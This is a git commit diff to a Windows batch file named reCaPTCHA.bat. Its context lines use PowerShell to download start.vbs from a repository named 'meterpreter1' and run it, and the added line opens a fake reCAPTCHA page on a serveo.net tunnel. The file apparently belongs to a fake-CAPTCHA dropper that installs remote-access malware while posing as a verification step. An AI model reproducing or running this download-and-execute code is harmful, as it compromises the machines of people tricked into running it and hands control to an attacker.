71fe716b0f6a72fabca9332bc4fd7968346343b3
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-09-21 20:07:22 +0300

    Update reCaPTCHA.bat

--- reCaPTCHA.bat
+++ reCaPTCHA.bat
@@ -8,3 +8,4 @@ if not exist "%startupPath%" (
     powershell -Command ^
         "try { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/0x2034/meterpreter1/main/start.vbs', 'start.vbs'); Start-Process 'start.vbs' } catch { Write-Output 'Failed to download or start the file. Error: $_' }"
 )
+start https://1c497c3c75bdb5b0fc7e446d2b1aa72d.serveo.net/reCaPTCHA/r.html
